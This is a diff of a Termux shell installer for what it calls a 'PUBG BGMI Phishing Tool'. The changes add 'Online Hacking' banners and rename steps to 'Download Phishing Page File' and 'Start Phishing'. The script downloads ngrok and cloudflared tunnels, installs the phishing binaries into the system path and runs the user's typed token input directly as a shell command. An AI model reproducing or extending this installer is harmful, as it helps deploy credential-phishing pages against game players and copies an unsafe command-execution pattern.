@@ -2,6 +2,64 @@
 echo ""
 clear
 echo ""
+
+logo() {
+echo -e ""
+echo -e "\e[33m
+  ██████╗ ██╗   ██╗██████╗  ██████╗       ██████╗  ██████╗ ███╗   ███╗██╗
+  ██╔══██╗██║   ██║██╔══██╗██╔════╝       ██╔══██╗██╔════╝ ████╗ ████║██║
+  ██████╔╝██║   ██║██████╔╝██║  ███╗█████╗██████╔╝██║  ███╗██╔████╔██║██║
+  ██╔═══╝ ██║   ██║██╔══██╗██║   ██║╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██║
+  ██║     ╚██████╔╝██████╔╝╚██████╔╝      ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║
+  ╚═╝      ╚═════╝ ╚═════╝  ╚═════╝       ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝ \e[0m\n"
+}
+
+logo2() {
+echo -e ""
+echo -e "\e[95m 
+         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
+        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
+        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
+        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
+        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
+         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
+                                                            
+     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
+     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
+     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
+     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
+     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
+     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
+  echo""
+  }
+
+logo3() {
+echo -e "\e[93m
+SUMAN ©\e[34m
+   ____        ___               __  __           __   _            
+  / __ \____  / (_)___  ___     / / / /___ ______/ /__(_)___  ____ _
+ / / / / __ \/ / / __ \/ _ \   / /_/ / __ `/ ___/ //_/ / __ \/ __ `/
+/ /_/ / / / / / / / / /  __/  / __  / /_/ / /__/ ,< / / / / / /_/ / 
+\____/_/ /_/_/_/_/ /_/\___/  /_/ /_/\__,_/\___/_/|_/_/_/ /_/\__, /  
+                                                           /____/   
+\e[m"
+echo ""
+}
+
+
+download() {
+echo -e "\e[92m
+  _____                      _                 _ 
+ |  __ \                    | |               | |
+ | |  | | _____      ___ __ | | ___   __ _  __| |
+ | |  | |/ _ \ \ /\ / / '_ \| |/ _ \ / _` |/ _` |
+ | |__| | (_) \ V  V /| | | | | (_) | (_| | (_| |
+ |_____/ \___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|                                               
+\e[m"
+}
+
+
+
 echo -e ""
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
@@ -17,8 +75,8 @@ echo ""
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Play Install & Use Video  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Ngrok  "
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Tool File  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Link Services  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Phishing Page File  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
 sleep 5
@@ -86,6 +144,7 @@ echo""
 if [[ $option == *'abcdeff12b476e48256775a4d69b65a'* ]]; then
 clear
 echo ""
+download
 echo ""
 echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The PUBG BGMI Phishing Tool Please Wait....  \e[0m"
 echo ""
@@ -110,6 +169,9 @@ pkg install gem -y
 gem install lolcat
 clear
 echo""
+logo2
+echo""
+download
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download Link Services         !!\e[0m'
@@ -120,6 +182,9 @@ wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/lates
 echo""
 clear
 echo ""
+logo
+echo ""
+download
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
@@ -135,6 +200,17 @@ chmod +x cloudflared-linux-arm64
 chmod +x PUBG
 chmod +x BGMI
 clear
+
+sleep 1
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == *'y'* ]]; then
+clear
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
@@ -145,11 +221,16 @@ echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
 echo ""
 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
 echo ""
-sleep 1
-echo ""
 read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
 $token
 echo ""
+exit
+fi
+if [[ $option == *'n'* ]]; then
+clear
+exit
+fi
+
 echo
 cp -R cloudflared-linux-arm64 ngrok SUMAN/X-Suit/
 cp -R cloudflared-linux-arm64 ngrok SUMAN/Avalanche-X-Suit-LuckySpin/
@@ -167,21 +248,24 @@ echo
 echo
 cp -R ngrok /data/data/com.termux/files/usr/bin
 cp -R cloudflared-linux-arm64 /data/data/com.termux/files/usr/bin
-cp -R SUMAN /data/data/com.termux/files/usr/bin
-cp -R SUMAN1 /data/data/com.termux/files/usr/bin
+cp -R .SUMAN /data/data/com.termux/files/usr/bin
 cp -R PUBG /data/data/com.termux/files/usr/bin
 cp -R BGMI /data/data/com.termux/files/usr/bin
 cp -R PUBG-BGMI_Phishing /data/data/com.termux/files/usr/bin
 cp -R OnlineHacking /data/data/com.termux/files/usr/bin
 cp -R links /data/data/com.termux/files/usr/bin
 echo
-rm -rf SUMAN SUMAN1 
+rm -rf .SUMAN
 echo
-echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
-sleep 2
+logo
+echo
+echo ""echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
+sleep 5
 echo
 echo
 clear
+logo2
+echo
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
@@ -190,7 +274,7 @@ echo
 echo -e "\e[1m \e[36m[+] There PUBG BGMI Phishing Tool Ready \e[m \e[21"
 echo
 echo
-echo -e "\e[92m[+] Open New type this command:\e[93m PUBG-BGMI_Phishing \e[m "
+echo -e "\e[92m[+] New type this command to start :\e[93m PUBG-BGMI_Phishing \e[m "
 echo
 fi
 sleep 3
